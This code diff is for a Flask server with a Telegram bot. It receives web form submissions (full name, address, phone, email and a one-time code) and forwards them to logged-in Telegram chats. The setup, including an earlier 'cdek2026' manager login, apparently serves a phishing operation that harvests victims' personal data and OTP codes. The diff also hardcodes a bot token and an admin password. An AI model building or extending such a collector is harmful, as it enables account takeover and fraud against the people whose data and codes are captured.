@@ -5,14 +5,12 @@ from flask import Flask, request, jsonify
 from flask_cors import CORS
 import telebot
 
-# Получение токена из переменных окружения (для Render) или дефолтного значения (для локального запуска)
-BOT_TOKEN = os.environ.get("BOT_TOKEN", "ВАШ_НОВЫЙ_ТОКЕН_ОТ_BOTFATHER")
+BOT_TOKEN = "8809641832:AAGYRF4EdDcHVE3hm3CXIzOPnuvPUojGOC4"  # Вставьте токен от @BotFather
 bot = telebot.TeleBot(BOT_TOKEN)
 
 # Допустимые логины и пароли
 ALLOWED_ACCOUNTS = {
-    "admin": "pass123",
-    "manager": "cdek2026"
+    "admin": "merlnv",
 }
 
 AUTH_FILE = "authorized_chats.json"
@@ -34,7 +32,7 @@ authorized_chats = load_authorized_chats()
 def send_welcome(message):
     bot.reply_to(
         message, 
-        "👋 Здравствуйте!\n\nДля получения уведомлений введите логин и пароль в формате:\n`/login логин пароль`", 
+        "👋 Здравствуйте!\n\nДля получения уведомлений о заявках введите логин и пароль в формате:\n`/login логин пароль`", 
         parse_mode="Markdown"
     )
 
@@ -66,7 +64,7 @@ CORS(app)
 def receive_lead():
     data = request.json or {}
     
-    # Проверка обязательных полей
+    # Проверка обязательных полей (код теперь НЕ обязателен)
     required_fields = ['fullName', 'address', 'phone', 'email']
     for field in required_fields:
         if not data.get(field) or str(data.get(field)).strip() == '':
@@ -75,7 +73,7 @@ def receive_lead():
     otp_display = data.get('otpCode') if data.get('otpCode') else "Не введен"
 
     message_text = (
-        f"🔔 *Новый клиент!*\n\n"
+        f"🔔 *Новая заявка на регистрацию*\n\n"
         f"👤 *ФИО:* {data['fullName']}\n"
         f"🏠 *Адрес:* {data['address']}\n"
         f"📞 *Телефон:* {data['phone']}\n"
@@ -94,13 +92,11 @@ def receive_lead():
     return jsonify({'status': 'success'}), 200
 
 def run_flask():
-    # Render передает динамический порт через переменную PORT
-    port = int(os.environ.get("PORT", 5000))
-    app.run(host='0.0.0.0', port=port)
+    app.run(host='0.0.0.0', port=5000)
 
 if __name__ == '__main__':
     flask_thread = Thread(target=run_flask)
     flask_thread.daemon = True
     flask_thread.start()
-    print("🚀 Сервер запущен...")
+    print("🚀 Сервер запущен на порту 5000...")
     bot.infinity_polling()
